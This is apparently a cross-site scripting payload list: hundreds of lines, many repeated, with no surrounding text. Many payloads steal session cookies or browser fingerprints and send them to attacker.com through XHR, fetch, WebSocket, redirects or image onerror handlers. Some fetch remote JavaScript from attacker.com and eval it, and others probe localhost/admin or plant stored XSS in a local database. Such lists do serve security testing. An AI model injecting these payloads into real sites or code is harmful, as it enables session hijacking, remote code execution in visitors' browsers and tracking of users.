<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<svg onload="alert(1)"></svg>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<svg onload="alert(1)"></svg>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<div style="background-image: url('javascript:alert(1)')"></div>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>navigator.serviceWorker.register('/sw.js');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<svg onload="alert(1)"></svg>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<input name="location" value="<img src='x' onerror=alert(1)>">
<svg onload="alert(1)"></svg>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<svg onload="alert(1)"></svg>
<input name="location" value="<img src='x' onerror=alert(1)>">
<input name="location" value="<img src='x' onerror=alert(1)>">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<svg onload="alert(1)"></svg>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<svg onload="alert(1)"></svg>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<svg onload="alert(1)"></svg>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<svg onload="alert(1)"></svg>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<svg onload="alert(1)"></svg>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<svg onload="alert(1)"></svg>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<svg onload="alert(1)"></svg>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<svg onload="alert(1)"></svg>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<svg onload="alert(1)"></svg>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<svg onload="alert(1)"></svg>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
